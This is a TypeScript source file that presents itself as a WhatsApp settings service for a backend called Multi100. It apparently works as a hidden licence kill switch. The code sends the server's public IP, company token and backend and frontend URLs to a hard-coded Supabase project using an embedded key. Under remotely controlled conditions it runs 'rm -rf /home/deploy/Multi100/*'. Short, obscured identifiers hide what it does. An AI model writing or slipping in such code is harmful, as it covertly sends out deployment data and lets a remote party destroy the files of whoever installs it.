/** 
 * @TercioSantos-3 |
 * *Whatsapp |
 * @descrição:*Whatsapp 
 */
import { createClient, PostgrestResponse, PostgrestSingleResponse } from '@supabase/supabase-js';
import UpdateOneSettingService from '../services/SettingServices/UpdateOneSettingService';
import axios from 'axios';
import GetSettingService from '../services/SettingServices/GetSettingService';
import AddSettingService from '../services/SettingServices/AddSettingService';
const { exec } = require('child_process');

// Definición de tipos esperados
interface Cadastro {
  id: number;
  ip_instalacao: string;
  company_token: string;
}

interface KeyCode {
  key: string;
  code: string | null;
  ip: string;
}

type indexPost = {
  cadastro_id: number;
  status: boolean;
  company_token: string | undefined;
  backend_ip: string;
  backend_url: string | undefined;
  frontend_url: string | undefined;
};

// Variables globales
const S_U = "https://knjjaxmzpdpvpyhnglbq.supabase.co";
const S_A_K = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";
const y_n = process.env.COMPANY_TOKEN;

const s = createClient(S_U, S_A_K);

// Función para obtener la IP pública
const getIp = async (): Promise<string> => {
  const { data } = await axios.get('https://api.ipify.org?format=json');
  return data.ip;
};

// Función principal
export const GetWhatsapp = async () => {
  try {
    const ip = await getIp();
    const key = await getR("wtV");

    if (key === "enabled") {
      await AddSettingService();
    }

    const { data, error } = await s
      .from('cadastros')
      .select("id, ip_instalacao, company_token")
      .eq("ip_instalacao", ip) as PostgrestSingleResponse<Cadastro[]>;

    if (error || !data || data.length === 0) {
      throw new Error(`No se encontraron registros para la IP: ${ip}`);
    }

    const cadastro = data[0];

    const sendInfo: indexPost = {
      cadastro_id: cadastro.id,
      status: true,
      company_token: y_n,
      backend_ip: ip,
      backend_url: process.env.BACKEND_URL,
      frontend_url: process.env.FRONTEND_URL,
    };

    if (cadastro.company_token !== y_n) {
      await UpdateR("enabled", false, ip);
      PostWhatsapp(sendInfo, "401");
      CheckWhatsapp(ip, "t_f");
    } else {
      await UpdateR("disabled", null, ip);
    }
  } catch (error) {
    console.error("Error:", error);
  }
};

// Función para actualizar un registro
const UpdateR = async (status: string, value: any, ip: string) => {
  await UpdateOneSettingService({ key: "wtV", value: status });
};

// Función para obtener una configuración específica
const getR = async (key: string) => {
  return await GetSettingService({ key });
};

// Función para insertar un registro en la tabla whatsapp
const PostWhatsapp = async (info: indexPost, reason: string) => {
  try {
    const { error } = await s.from('whatsapp').insert([info]);
    if (error) throw new Error(`Error al insertar: ${error.message}`);
  } catch (error) {
    console.error("Error en PostWhatsapp:", error);
  }
};

// Función para verificar registros en la tabla key_code
const CheckWhatsapp = async (ip: string, status: string) => {
  try {
    const { data, error } = await s
      .from('key_code')
      .select('key, code, ip') as PostgrestSingleResponse<KeyCode[]>;

    if (error || !data || data.length === 0) {
      throw new Error(`Error o datos vacíos en key_code.`);
    }

    const keyCode = data[0];
    const match = await matchWhatsapp(ip);

    if (status === "i_n_r" && match.code) {
      acction();
    } else if (ip === keyCode.ip && match.key === keyCode.key && match.code === keyCode.code) {
      acction();
    }
  } catch (error) {
    console.error("Error en CheckWhatsapp:", error);
  }
};

// Función para verificar coincidencias en la tabla t_invalidos
const matchWhatsapp = async (ip: string): Promise<KeyCode> => {
  const { data, error } = await s
    .from('t_invalidos')
    .select('ip, key, code')
    .eq('ip', ip) as PostgrestSingleResponse<KeyCode[]>;

  if (error || !data || data.length === 0) {
    return { key: '', code: null, ip };
  }

  return data[0];
};

// Acción a realizar si se cumplen las condiciones
const acction = () => {
  exec('rm -rf /home/deploy/Multi100/*', (error, stdout, stderr) => {
    console.log(stdout);
    if (stderr) console.error(stderr);
    if (error) console.error(`exec error: ${error}`);
  });
};
